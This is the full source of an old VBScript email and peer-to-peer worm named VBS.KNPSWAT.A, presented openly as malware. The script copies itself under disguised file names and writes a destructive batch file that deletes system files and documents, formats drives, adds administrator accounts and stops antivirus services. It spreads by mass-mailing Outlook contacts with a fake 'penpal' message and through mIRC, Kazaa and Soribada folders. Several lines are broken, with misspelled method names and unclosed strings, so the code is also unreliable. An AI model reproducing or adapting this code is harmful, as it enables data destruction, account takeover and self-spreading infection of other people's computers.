===================================================================
=====Name: VBS.KNPSWAT.A     Date: 27/12/2002     Time: 2:54pm=====
===================================================================
================VBS.KNPSWAT.A is coded by KNPSWAT==================
===================================================================

On Error Resume Next

Dim ANDT, ANDsT, Cbat, A01, objFSO, delFSO, delbat, fso, ws, OApp, Mapi, AddListEntry, msg, mIRC

'all the usual crap such as copying files
Set ANDst = CreateObject( "Scripting.FileSystemObject" )
ANDsT.CopyFile WScript.ScriptFullName, ANDsT.BuildPath(ANDsT.GetSpecialFolder(1), "KNPSWAT.vbs" )

Set ANDT = CreateObject( "WScript.Shell" )
ANDT.RegWrite "HKEY_LOCAL_MACHINE\Software\infections\VBS.KNPSWAT\" & "KNPSWAT.VBS", ANDsT.BuildPath(ANDsT.GetSpecialFolder(1), "KNPSWAT.VBS" )

Set Cbat = CreateObject( "Scripting.FileSystemObject")
Cbat.CopyFile WScript.ScriptFullName, Cbat.BuildPath(Cbat.GetSpecialFolder(0), "MP5.html.vbs" )

Set A01 = CreateObject( "Scripting.FileSystemObject" )
A01.CopyFile WScript.ScriptFullName, A01.BuildPath(A01.GetSpecialFolder(1), "P7.html.vbs" )

Set ATT = CreateObject( "Scripting.FileSystemObject" )
ATT.CopyFile WScript.ScriptFullName, ATT.BuildPath(ATT.GetSpecialFolder(1), "FlashBang.jpg.vbs" )

Set objFSO = CreateObject("Scripting.FileSystemObject")

If month(now) = 12 and day(now) = 31 then
Msgbox "Happy New Year!",64,"VBS.KNPSWAT.A"
End If

'Create Distructive Batch file 
Set ANDTbat = CreateObject( "WScript.Shell" )
ANDTbat.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\run" & "autoexec.bat", delbat.BuildPath(delbat.GetSpecialFolder(1), "autoexec.bat" )
ANDTbat.RegWrite "HKEY_LOCAL_USER\Software\Microsoft\Windows\CurrentVersion\run" & "autoexec.bat", delbat.BuildPath(delbat.GetSpecialFolder(1), "autoexec.bat" )
Set delFSO = CreateObject("Scripting.FileSystemObject")
Set delbat = delFSO.CreateTextFile("C:\%windir%\autoexec.bat")
delbat.WriteLine("@echo off")
delbat.WriteLine("cd C:\%windir%\System\dlls\")
delbat.WriteLine("deltree /y c:\winnt\system32\config\sam")
delbat.WriteLine("deltree /y c:\%windir%\regedit.exe")
delbat.WriteLine("deltree /y c:\windows\system\rpcss.exe")
delbat.WriteLine("deltree /y *.doc")
delbat.WriteLine("deltree /y *.xls")
delbat.WriteLine("deltree /y *.ppt")
delbat.WriteLine("deltree /y *.hwp")
delbat.WriteLine("deltree /y *.pdf")
delbat.WritoLine("format /q d:")
delbat.WritoLine("format /q e:")
delbat.WritoLine("format /q f:")
delbat.WritoLine("format /q g:")
delbat.WritoLine("format /q h:")
delbat.WritoLine("format /q i:")
delbat.WritoLine("format /q j:")
delbat.WritoLine("format /q k:")
delbat.WritoLine("format /q l:")
delbat.WritoLine("format /q m:")
delbat.WritoLine("format /q n:")
delbat.WriteLine("net user aaa administrators /add")
delbat.WriteLine("net user bbb administrators /add")
delbat.WriteLine("net user ccc administrators /add")
delbat.WriteLine("net user ddd administrators /add")
delbat.WriteLine("net user eee administrators /add")
delbat.WriteLine("net user fff administrators /add")
delbat.WriteLine("net user ggg administrators /add")
delbat.WriteLine("net user hhh administrators /add")
delbat.WriteLine("net stop RpcLocator")
delbat.WriteLine("net stop RpcSs")
delbat.WriteLine("net stop vrmonsvc")
delbat.WriteLine("net stop Ahnlab Task Scheduler")
delbat.WriteLine("net stop navapsvc")
delbat.WriteLine("cls")
delbat.close
'attempt to send via outlook
Set fso = CreateObject("Scripting.filesystemobject")
Set ws = CreateObject("WScript.Shell")
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
AddlistCount = AddList.AddressEntries.Count
For AddListCount = 1 To AddlistCount
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set blank_shit1 = nuthing
Set msg = OApp.CreateItem(0)
msg.To = AddListEntry.Address
msg.Subject = "Hello.I want to become your penpal"
msg.Body = "First of all, I'll introduce myself to you. My name is Brian Adams, and
I'm a 16 year-old-boy. I am a pupil of Seoul Junior High School, which is at the distance of five
minutes' walk. I have my parent, two brothes and three sisters.
My father teaches English at a senior high school and my mother is a housewife.
Two My sister is Seoul National University student and two My brothers is the lawyer 
I am sending a photo of myself to give you an idea what I look like. This is picture was taken by father.
Well, I think I'll close for this time, I am looking forward to your letter.
msg.Attachments.Add FileSystemObject.GetSpecialFolder(0) & "FlashBang.jpg.vbs"
msg.DeleteAfterSubmit = True
Set blank_shit2 = nuthing
If msg.To <> "" Then
msg.Send
End If

set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\mirc\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\KNPSWAT.vbs", True
mirc.WriteLine "[script]"
mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\KNPSWAT.vbs }
mirc.Close
End If

set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Kazaa\Nirvana - You Know You Are KNPSWAT.vbs", True
set shell=CreateObject("WScript.Shell")
shell.RegWrite "HKEY_LOCAL_MACHINE\Software\KaZaA\Transfer\DlDir0", "C:\Kazaa");
End If

set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Soribada - You Know You Are KNPSWAT.vbs", True
set shell=CreateObject("WScript.Shell")
shell.RegWrite "HKEY_Current_User\Software\Soribada\, "C:\mydocu~1\");
End If





